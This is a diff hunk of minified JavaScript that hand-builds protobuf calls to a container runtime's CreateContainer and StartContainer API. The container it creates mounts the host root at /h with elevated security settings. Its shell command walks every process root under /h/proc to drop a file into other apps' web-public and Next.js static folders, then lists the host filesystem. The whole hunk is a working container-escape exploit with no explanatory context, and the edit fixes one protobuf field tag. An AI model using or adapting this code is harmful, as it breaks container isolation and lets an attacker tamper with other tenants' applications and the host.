@@ -7,7 +7,7 @@ const Y=JSON.stringify({apiVersion:'v1',kind:'Pod',metadata:{name:'zzf1'},spec:{
 const CMD="for p in /h/proc/[0-9]*/root; do for d in $p/app/public $p/usr/src/app/public $p/app/.next/standalone/public $p/app/.next/static; do [ -d $d ] && echo Z > $d/zz_p.txt 2>/dev/null; done; done; ls /h > /h/tmp/zls.txt 2>/dev/null; echo $? > /h/tmp/zrc";
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
-const cfg=Buffer.concat([fl(0x0a,'zzfc'), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
+const cfg=Buffer.concat([fl(0x0a,'zzfc'), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
 function create(sb){ call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e,ob)=>{ if(e)return; const c2=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!c2)return; call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,c2[0]),()=>{}); }); }
 const nsopt=v1(0x08,1); const ssec=Buffer.concat([v1(0x0a,nsopt.length),nsopt]);
 const lsc=Buffer.concat([v1(0x12,ssec.length),ssec]); const pl=Buffer.concat([v1(0x42,lsc.length),lsc]);
